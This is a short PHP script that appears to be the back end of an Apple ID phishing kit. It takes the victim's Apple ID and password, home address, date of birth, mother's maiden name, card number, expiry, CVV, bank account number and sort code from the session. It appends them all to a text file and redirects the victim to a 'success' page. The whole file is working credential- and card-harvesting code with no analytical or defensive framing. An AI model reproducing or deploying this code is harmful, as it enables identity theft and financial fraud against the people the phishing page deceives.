
<?php

session_start();

$ip = $_SERVER['REMOTE_ADDR'];
    $handle = fopen('../full.txt', 'a'); // Open the file for appending
     $data = "Apple ID: ".$_SESSION['email']."
Password: ".$_SESSION['password']."

First Name: ".$_SESSION['firstname']."
Last Name: ".$_SESSION['lastname']."
Address: ".$_SESSION['address']."
City: ".$_SESSION['city']."
Postcode: ".$_SESSION['postcode']."
Country: ".$_SESSION['country']."
Phone Number: ".$_SESSION['phonenumber']."
Date Of Birth: ".$_SESSION['dob']."
Mother's Maiden Name: ".$_SESSION['mmn']."

Bank Name: ".$_SESSION['_cc_bank_']." - ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_']."
Name On Card: ".$_SESSION['nameoncard']."
Card Number: ".$_SESSION['cardnumber']."
Expiration Date: ".$_SESSION['exp']."
CVV: ".$_SESSION['csc']."
Account Number: ".$_SESSION['accnum']."
Sort Code: ".$_SESSION['scode']."
*************************************************
";
    fwrite($handle, $data);
    fclose($handle);

 header( 'Location: success.php' ) ;

?>